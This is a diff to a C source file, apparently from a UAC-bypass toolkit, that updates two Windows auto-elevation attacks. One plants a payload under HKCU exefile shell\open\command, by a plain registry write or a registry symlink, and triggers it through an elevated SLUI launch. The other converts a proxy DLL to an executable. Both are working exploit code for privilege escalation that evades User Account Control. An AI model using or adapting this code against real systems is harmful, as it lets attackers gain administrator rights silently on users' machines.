@@ -4,9 +4,9 @@
 *
 *  TITLE:       BYTECODE77.C
 *
-*  VERSION:     2.87
+*  VERSION:     3.00
 *
-*  DATE:        19 Jan 2018
+*  DATE:        25 Aug 2018
 *
 *  bytecode77 autoelevation methods.
 *
@@ -30,7 +30,7 @@
 #include "global.h"
 
 /*
-* ucmMethodVolatileEnv
+* ucmVolatileEnvMethod
 *
 * Purpose:
 *
@@ -39,7 +39,7 @@
 * Fixed in Windows 10 RS3
 *
 */
-BOOL ucmMethodVolatileEnv(
+BOOL ucmVolatileEnvMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
@@ -52,8 +52,13 @@ BOOL ucmMethodVolatileEnv(
         //
         // Replace default Fubuki dll entry point with new and remove dll flag.
         //
-        if (!supConvertDllToExeSetNewEP(ProxyDll, ProxyDllSize, FUBUKI_DEFAULT_ENTRYPOINT))
+        if (!supConvertDllToExeSetNewEP(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_DEFAULT_ENTRYPOINT))
+        {
             break;
+        }
 
         //
         // Create %temp%\KureND directory.
@@ -105,22 +110,22 @@ BOOL ucmMethodVolatileEnv(
 }
 
 /*
-* ucmMethodSluiHijack
+* ucmSluiHijackMethod
 *
 * Purpose:
 *
 * Bypass UAC using registry HKCU\Software\Classes\exefile\shell\open hijack and SLUI elevated launch.
 *
 */
-BOOL ucmMethodSluiHijack(
+BOOL ucmSluiHijackMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL bResult = FALSE;
+    BOOL bResult = FALSE, bSymLinkCleanup = FALSE, bValueSet = FALSE;
     HKEY hKey = NULL;
-    LRESULT lResult;
     SIZE_T sz = 0;
-    DWORD cbData = 0;
+    LRESULT lResult;
+    DWORD cbData = 0, dwKeyDisposition = 0;
     WCHAR szBuffer[MAX_PATH * 2];
 
     SHELLEXECUTEINFO shinfo;
@@ -136,30 +141,60 @@ BOOL ucmMethodSluiHijack(
     }
 #endif
 
+    sz = _strlen(lpszPayload);
+    if (sz == 0)
+        return FALSE;
+
      //
      // Create or open target key.
      //
     _strcpy(szBuffer, T_EXEFILE_SHELL);
     _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
     lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
-        REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+        REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, &dwKeyDisposition);
 
     if (lResult == ERROR_SUCCESS) {
+
+        lResult = ERROR_ACCESS_DENIED;
 
         //
         // Set "Default" value as our payload.
         //
-        sz = _strlen(lpszPayload);
         cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
 
-        lResult = RegSetValueEx(
-            hKey,
-            TEXT(""),
-            0, REG_SZ,
-            (BYTE*)lpszPayload,
-            cbData);
+        switch (g_ctx.MethodExecuteType) {
+        
+        case ucmExTypeRegSymlink:
+            
+            if (NT_SUCCESS(supRegSetValueIndirectHKCU(
+                szBuffer, 
+                NULL, 
+                lpszPayload, 
+                (ULONG)cbData))) 
+            {
+                bSymLinkCleanup = TRUE;
+                lResult = ERROR_SUCCESS;
+            }
 
-        if (lResult == ERROR_SUCCESS) {
+            break;
+
+        case ucmExTypeDefault:
+        default:
+
+            lResult = RegSetValueEx(
+                hKey,
+                TEXT(""),
+                0, REG_SZ,
+                (BYTE*)lpszPayload,
+                cbData);
+            
+
+            break;
+        }
+
+        bValueSet = (lResult == ERROR_SUCCESS);
+
+        if (bValueSet) {
 
             //
             // Run trigger application.
@@ -179,10 +214,33 @@ BOOL ucmMethodSluiHijack(
                 TerminateProcess(shinfo.hProcess, 0);
                 CloseHandle(shinfo.hProcess);
             }
-            RegDeleteValue(hKey, TEXT(""));
         }
-        RegFlushKey(hKey);
         RegCloseKey(hKey);
+    }
+
+    //
+    // Remove symlink if set.
+    //
+    if (bSymLinkCleanup)
+        supRemoveRegLinkHKCU();
+
+    //
+    // Remove key with all subkeys.
+    //
+    if (dwKeyDisposition == REG_CREATED_NEW_KEY) {
+        supRegDeleteKeyRecursive(
+            HKEY_CURRENT_USER, 
+            T_EXEFILE_SHELL);
+    }
+    else {
+        if (bValueSet) {
+            _strcpy(szBuffer, T_EXEFILE_SHELL);
+            _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
+            supDeleteKeyValueAndFlushKey(
+                HKEY_CURRENT_USER,
+                szBuffer,
+                TEXT(""));
+        }
     }
 
 #ifndef _WIN64
